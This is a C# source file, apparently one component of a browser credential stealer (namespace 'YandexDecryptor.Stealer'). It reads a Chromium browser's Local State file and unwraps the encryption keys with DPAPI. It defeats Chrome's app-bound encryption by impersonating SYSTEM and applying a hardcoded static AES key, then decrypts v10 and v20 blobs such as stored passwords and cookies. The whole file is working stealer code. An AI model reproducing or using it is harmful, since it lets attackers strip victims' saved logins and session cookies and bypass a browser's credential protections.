using System;
using System.IO;
using System.Text;
using System.Security.Principal;
using System.Collections.Generic;
using System.Security.Cryptography;

using YandexDecryptor.Helpers;
using YandexDecryptor.Helpers.Json;

namespace YandexDecryptor.Stealer.Browsers.Chromium
{
    internal sealed class LocalState
    {
        private FileInfo localStateFile { get; set; }
        private JSONNode Content { get; set; }
        public byte[] EncryptionKey { get; private set; }   
        public byte[] AppBoundEncryptionKey { get; private set; }


        public LocalState(string filename) : this(new FileInfo(filename))
        {
        }

        public LocalState(FileInfo filename) 
        {
            localStateFile = filename;
            if (Exists()) 
            {
                Content = JSON.Parse(IOUtils.ReadFileText(localStateFile.FullName));
                EncryptionKey = ParseEncryptedKey();
                try
                {
                    AppBoundEncryptionKey = ParseAppBound();
                } catch (Exception ex) 
                {
                    Console.WriteLine("[APPB] " + ex.Message);
                }
                
            }
        }

        public bool Exists() => localStateFile.Exists;

        public IEnumerable<Models.BrowserProfile> GetProfiles()
        {
            JSONNode profiles = Content["profile"]["info_cache"];
            if (profiles == null)
            {
                yield return new Models.BrowserProfile()
                {
                    Name = "Default",
                    InternalName = string.Empty,
                };
                
            } else
            {
                foreach (KeyValuePair<string, JSONNode> profile in profiles)
                {
                    yield return new Models.BrowserProfile()
                    {
                        Name = profile.Value["name"],
                        InternalName = profile.Key
                    };
                }
            }
        }

        private byte[] ParseEncryptedKey()
        {
            string encodedKey = Content["os_crypt"]["encrypted_key"].Value;
            if (!string.IsNullOrEmpty(encodedKey))
            {
                byte[] decodedKeyFull = Convert.FromBase64String(encodedKey);
                // Remove DPAPI
                byte[] decodedKey = new byte[decodedKeyFull.Length - 5];
                Array.Copy(decodedKeyFull, 5, decodedKey, 0, decodedKey.Length);
                // Decrypt key
                return ProtectedData.Unprotect(decodedKey, null, DataProtectionScope.CurrentUser);
            }
            return null;
        }

        private byte[] ParseAppBound()
        {
            string encodedKey = Content["os_crypt"]["app_bound_encrypted_key"].Value;

            // Check if the current user is in the Administrators role
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            bool is_admin = principal.IsInRole(WindowsBuiltInRole.Administrator);

            if (!string.IsNullOrEmpty(encodedKey) && is_admin)
            {
                // Decode Base64
                byte[] decodedKeyFull = Convert.FromBase64String(encodedKey);

                // Remove APPB
                byte[] decodedKey = new byte[decodedKeyFull.Length - 4];
                Array.Copy(decodedKeyFull, 4, decodedKey, 0, decodedKey.Length);

                // Unprotect with System context
                using (WindowsImpersonationContext impersonationContext = Elevator.ImpersonateSystem())
                {
                    decodedKey = ProtectedData.Unprotect(decodedKey, null, DataProtectionScope.CurrentUser);
                }
                // Unprotect with User context
                decodedKey = ProtectedData.Unprotect(decodedKey, null, DataProtectionScope.CurrentUser);

             
                // Decrypt with static key from elevator service (Chrome only)
                if (Encoding.ASCII.GetString(decodedKey).Contains("Google\\Chrome"))
                {
                    byte[] key = Convert.FromBase64String("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=");
                    int offset = decodedKey.Length - 61;
                    byte[] iv = new byte[12];
                    Array.Copy(decodedKey, offset + 1, iv, 0, 12);
                    byte[] ciphertext = new byte[32];
                    Array.Copy(decodedKey, offset + 1 + 12, ciphertext, 0, 32);
                    int tagLength = decodedKey.Length - (offset + 1 + 12 + 32);
                    byte[] tag = new byte[tagLength];
                    Array.Copy(decodedKey, offset + 1 + 12 + 32, tag, 0, tagLength);
                    return AesGcm.Decrypt(key, iv, null, ciphertext, tag);

                }
                else
                {
                    byte[] last32Bytes = new byte[32];
                    Array.Copy(decodedKey, decodedKey.Length - 32, last32Bytes, 0, 32);
                    return last32Bytes;
                }
            }

            return null;
        }


        public string Decrypt(byte[] buffer)
        {
            if (buffer == null || buffer.Length < 3) return "";

            string version = Encoding.ASCII.GetString(buffer, 0, 3);

            // Define arrays for IV, encrypted/decrypted data, and tag
            byte[] encryptedData, decryptedData;
            byte[] iv = new byte[12];
            byte[] tag = new byte[16];

            if (version == "v20" && AppBoundEncryptionKey != null && AppBoundEncryptionKey.Length == 32)
            {
                // v20 configuration
                Array.Copy(buffer, 3, iv, 0, 12);
                int encryptedDataLength = buffer.Length - (3 + 12 + 16);
                encryptedData = new byte[encryptedDataLength];
                Array.Copy(buffer, 3 + 12, encryptedData, 0, encryptedDataLength);
                Array.Copy(buffer, buffer.Length - 16, tag, 0, 16);

                byte[] nonStrippedData = AesGcm.Decrypt(AppBoundEncryptionKey, iv, null, encryptedData, tag);

                // Slice the first 32 bytes from decrypted
                decryptedData = new byte[nonStrippedData.Length - 32];
                Array.Copy(nonStrippedData, 32, decryptedData, 0, nonStrippedData.Length - 32);
            }
            else if (version == "v10" && EncryptionKey != null && EncryptionKey.Length == 32)
            {
                // v10 configuration with zero-padded IV
                Array.Copy(buffer, 3, iv, 0, 12);
                int encryptedDataLength = buffer.Length - 15 - 16;
                encryptedData = new byte[encryptedDataLength];
                Array.Copy(buffer, 15, encryptedData, 0, encryptedDataLength);
                Array.Copy(buffer, buffer.Length - 16, tag, 0, 16);

                decryptedData = AesGcm.Decrypt(EncryptionKey, iv, null, encryptedData, tag);
            }
            else if (buffer[0] == 0x01 && buffer[1] == 0x00 && buffer[2] == 0x00 && buffer[3] == 0x00)
            {
                // DPAPI decryption
                decryptedData = ProtectedData.Unprotect(buffer, null, DataProtectionScope.CurrentUser);
            }
            else
            {
                // Plain text
                decryptedData = buffer;
            }

            return Encoding.UTF8.GetString(decryptedData);
        }


    }
}
